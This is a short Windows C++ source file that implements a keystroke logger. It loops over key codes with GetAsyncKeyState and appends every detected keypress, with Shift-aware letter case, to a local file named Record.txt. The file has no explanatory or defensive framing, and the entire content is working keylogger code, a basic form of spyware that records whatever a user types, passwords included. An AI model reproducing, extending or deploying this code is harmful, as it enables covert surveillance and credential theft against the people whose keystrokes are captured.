#include<iostream>
#include<windows.h>
#include<Winuser.h>
#include<fstream>

using namespace std;

void log();

int main(void)
{
	log();
	
	return (0);
}
void log()
{
	unsigned char key;
	
	for (;;)
	{
		for (key = 8; key <= 222; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				ofstream write("Record.txt", ios::app);
				
				if (((key > 64) && (key < 91)) && !(GetAsyncKeyState(0x10)))
				{
					key += 32;
					write <<key;
					write.close();
					break;
				}
				else if ((key > 64) && (key < 91))
				{
					write <<key;
					write.close();
					break;
				}
				else
				{
					switch(key)
					{
						case 49:
						{
							if (GetAsyncKeyState(0x10))
								write <<"!";
							else
								write <<"1";
						}
					}					
				}
/*
				switch (key)
				{
					case 8:
						write <<"<BACKSPACE>";
					case 27:
						write <<"<>";
					case 127:
						write <<"<DEL>";
					case 32:
						write <<" ";
					case 13:
						write <<"<ENTER>\n";
					default:
						write << key;
				}*/
			}
		}
	}
}
